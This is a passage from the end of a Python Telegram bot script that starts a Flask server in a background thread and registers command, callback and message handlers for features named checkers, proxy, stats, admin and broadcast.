    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Flask server starting on port {port}")
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ============================================
# MAIN FUNCTION
# ============================================
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("checkers", checkers_command))
    app.add_handler(CommandHandler("proxy", proxy_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("about", about_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("resetstats", reset_stats_command))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    app.add_handler(CallbackQueryHandler(checkers_callback, pattern="^checkers$"))  # Start Now button
    app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
    app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
    app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy$"))
    app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
    app.add_handler(CallbackQueryHandler(proxy_stats_callback, pattern="^proxy_stats"))
    app.add_handler(CallbackQueryHandler(proxy_clear_callback, pattern="^proxy_clear"))
    app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    
    logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
    logger.info(f"📱 Bot: {BOT_USERNAME}")
    logger.info(f"🔗 Channel: {BOT_LINK}")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(2)
    main()
